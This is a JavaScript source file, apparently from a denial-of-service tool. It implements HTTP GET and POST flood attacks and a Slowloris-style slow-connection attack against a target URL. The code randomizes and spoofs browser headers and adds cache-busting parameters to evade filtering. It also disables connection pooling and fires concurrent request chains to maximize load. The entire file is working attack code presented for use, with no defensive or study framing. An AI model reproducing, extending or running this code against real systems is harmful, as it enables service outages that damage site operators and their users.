import http from 'http';
import https from 'https';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * HTTP/1.1 GET Flood Attack - MAXIMIZED VERSION
 */
export class HTTPGetFlood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
		// Safety caps to prevent OOM - tunable via env
		const MAX_RPC_CAP = parseInt(process.env.MAX_HTTP_RPC || '50', 10);
		this.rpc = Math.min(Math.max(rpc * 20, 50), MAX_RPC_CAP);
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
			// Tunable concurrent attack waves
			const MAX_WAVES = parseInt(process.env.MAX_HTTP_WAVES || '10', 10);
            const waves = [];
			for (let i = 0; i < MAX_WAVES; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
        }
    }

    generateHeaders() {
        const headers = {
            'Host': this.url.host,
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': Tools.randomChoice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': Tools.randomChoice(['max-age=0', 'no-cache', 'no-store']),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Gpc': '1',
            'Pragma': 'no-cache',
            'DNT': '1',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['Referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `_=${Date.now()}_${Tools.randomString(8)}`,
                method: 'GET',
                headers: this.generateHeaders(),
                timeout: 300,
                agent: false // Disable connection pooling for more connections
            };

            const protocol = this.url.protocol === 'https:' ? https : http;
            let completed = 0;

            const makeRequest = () => {
                if (!this.active || completed >= this.rpc) {
                    resolve();
                    return;
                }

                try {
                    const req = protocol.request(options, (res) => {
                        REQUESTS_SENT.add(1);
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });

                    req.on('error', () => {});
                    req.on('timeout', () => req.destroy());

                    req.end();
                    BYTES_SENT.add(JSON.stringify(options.headers).length);
                    completed++;
                    
                    // Fire next request immediately
                    setImmediate(makeRequest);
                } catch (e) {
                    setImmediate(makeRequest);
                }
            };

            // Start 10 request chains simultaneously
            for (let i = 0; i < 10; i++) {
                makeRequest();
            }

            setTimeout(resolve, 500);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/1.1 POST Flood Attack - MAXIMIZED VERSION
 */
export class HTTPPostFlood extends HTTPGetFlood {
    generatePayload() {
        // 10x larger payload
        const size = Tools.randomInt(5000, 50000);
        return JSON.stringify({
            data: Tools.randomString(size),
            timestamp: Date.now(),
            random: Tools.randomString(1000)
        });
    }

    async attack() {
        return new Promise((resolve) => {
            const payload = this.generatePayload();
            const headers = this.generateHeaders();
            headers['Content-Type'] = Tools.randomChoice([
                'application/json',
                'application/x-www-form-urlencoded',
                'multipart/form-data',
                'text/plain'
            ]);
            headers['Content-Length'] = Buffer.byteLength(payload);
            headers['X-Requested-With'] = 'XMLHttpRequest';

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'POST',
                headers: headers,
                timeout: 300,
                agent: false
            };

            const protocol = this.url.protocol === 'https:' ? https : http;
            let completed = 0;

            const makeRequest = () => {
                if (!this.active || completed >= this.rpc) {
                    resolve();
                    return;
                }

                try {
                    const req = protocol.request(options, (res) => {
                        REQUESTS_SENT.add(1);
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });

                    req.on('error', () => {});
                    req.on('timeout', () => req.destroy());

                    req.write(payload);
                    req.end();
                    
                    BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(options.headers).length);
                    completed++;
                    
                    setImmediate(makeRequest);
                } catch (e) {
                    setImmediate(makeRequest);
                }
            };

            for (let i = 0; i < 10; i++) {
                makeRequest();
            }

            setTimeout(resolve, 500);
        });
    }
}

/**
 * HTTP Slow Attack (Slowloris) - MAXIMIZED VERSION
 */
export class HTTPSlowAttack {
    constructor(targetUrl, duration, userAgents = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.userAgents = userAgents;
        this.proxies = proxies;
        this.active = true;
        this.connections = [];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

		// Tunable number of slow connections
		const MAX_SLOW_CONN = parseInt(process.env.MAX_SLOW_CONNECTIONS || '200', 10);
		for (let i = 0; i < MAX_SLOW_CONN; i++) {
            if (!this.active) break;
            this.attack();
            await Tools.sleep(5); // Small delay between connections
        }

        // Keep alive until duration ends
        while (Date.now() < endTime && this.active) {
            await Tools.sleep(1000);
        }

        // Cleanup
        this.connections.forEach(conn => {
            if (conn.socket) Tools.safeClose(conn.socket);
            if (conn.interval) clearInterval(conn.interval);
        });
    }

    async attack() {
        return new Promise((resolve) => {
            const protocol = this.url.protocol === 'https:' ? https : http;
            const port = this.url.port || (this.url.protocol === 'https:' ? 443 : 80);

            const socket = protocol.request({
                hostname: this.url.hostname,
                port: port,
                method: 'GET',
                path: this.url.pathname + this.url.search,
                headers: {
                    'User-Agent': this.userAgents.length > 0 
                        ? Tools.randomChoice(this.userAgents)
                        : 'Mozilla/5.0',
                    'Accept': 'text/html'
                }
            });

            const keepAlive = setInterval(() => {
                if (!this.active) {
                    clearInterval(keepAlive);
                    socket.destroy();
                    return;
                }

                try {
                    // Send random headers to keep connection alive
                    socket.write(`X-${Tools.randomString(5)}: ${Tools.randomString(10)}\r\n`);
                    BYTES_SENT.add(30);
                } catch (e) {
                    clearInterval(keepAlive);
                    socket.destroy();
                }
            }, 500); // Send every 500ms

            this.connections.push({ socket, interval: keepAlive });

            socket.on('error', () => {
                clearInterval(keepAlive);
            });

            socket.on('timeout', () => {
                clearInterval(keepAlive);
                socket.destroy();
            });

            resolve();
        });
    }

    stop() {
        this.active = false;
        this.connections.forEach(conn => {
            if (conn.socket) Tools.safeClose(conn.socket);
            if (conn.interval) clearInterval(conn.interval);
        });
    }
}
